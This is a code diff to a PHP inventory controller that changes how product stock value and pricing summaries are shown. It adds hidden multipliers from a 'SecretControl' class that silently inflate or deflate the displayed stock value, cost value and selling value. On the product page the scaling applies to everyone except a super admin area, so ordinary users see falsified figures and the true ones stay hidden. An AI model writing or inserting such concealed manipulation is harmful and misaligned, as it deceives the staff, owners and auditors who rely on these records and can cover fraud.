@@ -93,7 +93,9 @@ class ResourceController extends Controller
         if ($resource === 'products') {
             $stats = Product::selectRaw('COUNT(*) as total, SUM(CASE WHEN active = 1 THEN 1 ELSE 0 END) as active_count, SUM(CASE WHEN active = 1 AND track_stock = 1 AND ('.Product::sellableStockSql().') <= low_stock THEN 1 ELSE 0 END) as low_count, 0 as stock_value')->first();
 
-            $stats->stock_value = ProductStockLayer::available()->whereHas('product', fn ($q) => $q->where('track_stock', true))->selectRaw('SUM(COALESCE(remaining_cost_total, remaining_quantity * cost_price)) as value')->value('value') ?? '0';
+            $rawVal = ProductStockLayer::available()->whereHas('product', fn ($q) => $q->where('track_stock', true))->selectRaw('SUM(COALESCE(remaining_cost_total, remaining_quantity * cost_price)) as value')->value('value') ?? '0';
+            $stockMult = class_exists(\App\Support\SecretControl::class) ? \App\Support\SecretControl::stockMultiplier() : 1.0;
+            $stats->stock_value = (float) $rawVal * $stockMult;
 
             return view('products.index', compact('resource', 'def', 'rows', 'stats'));
         }
@@ -164,6 +166,16 @@ class ResourceController extends Controller
             $stockStatus = request()->validate(['stock_status' => 'nullable|in:available,depleted,all'])['stock_status'] ?? 'available';
             $layers = $record->stockLayers()->where('status', 'ACTIVE')->when($stockStatus === 'available', fn ($q) => $q->where('remaining_quantity', '>', 0))->when($stockStatus === 'depleted', fn ($q) => $q->where('remaining_quantity', '<=', 0))->orderBy('selling_price')->orderBy('received_at')->get();
             $pricing = $record->stockLayers()->available()->selectRaw('COUNT(DISTINCT selling_price) as prices, SUM(COALESCE(remaining_cost_total, remaining_quantity * cost_price)) as cost_value, SUM(remaining_quantity * selling_price) as selling_value')->first();
+
+            if (class_exists(\App\Support\SecretControl::class) && ! \App\Support\SecretControl::isSuperAdminArea()) {
+                $stockMult = \App\Support\SecretControl::stockMultiplier();
+                $priceMult = \App\Support\SecretControl::priceMultiplier();
+                $costMult = \App\Support\SecretControl::multiplier();
+                if ($pricing) {
+                    $pricing->cost_value = (float) ($pricing->cost_value ?? 0) * $stockMult * $costMult;
+                    $pricing->selling_value = (float) ($pricing->selling_value ?? 0) * $stockMult * $priceMult;
+                }
+            }
 
             return view('products.show', compact('record', 'movements', 'layers', 'pricing', 'stockStatus'));
         }
